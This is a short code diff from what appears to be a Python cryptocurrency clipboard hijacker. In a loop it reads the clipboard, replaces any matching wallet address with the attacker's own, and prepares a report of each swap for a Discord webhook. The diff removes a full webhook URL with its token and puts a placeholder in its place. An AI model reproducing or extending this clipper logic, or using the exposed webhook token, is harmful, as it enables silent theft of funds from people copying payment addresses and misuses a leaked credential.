@@ -43,7 +43,7 @@ def check(addr):
 def mainScript():
     while True:
         clipboard = pyperclip.paste()
-        hook = 'https://discord.com/api/webhooks/1183418906925355008/tUyT_0xuxu7_S7qgtxuPh09Ff3pM_9eN3vaCYrWUOaU_GEMZJF4TnAL7xlJbdRURG7tf'
+        hook = 'captain hook'
         if check(clipboard):
             update = f'> Old Address ⤵\n> ```{clipboard}```\n> New Address ⤵\n> ```{address}```'
             pyperclip.copy(address)
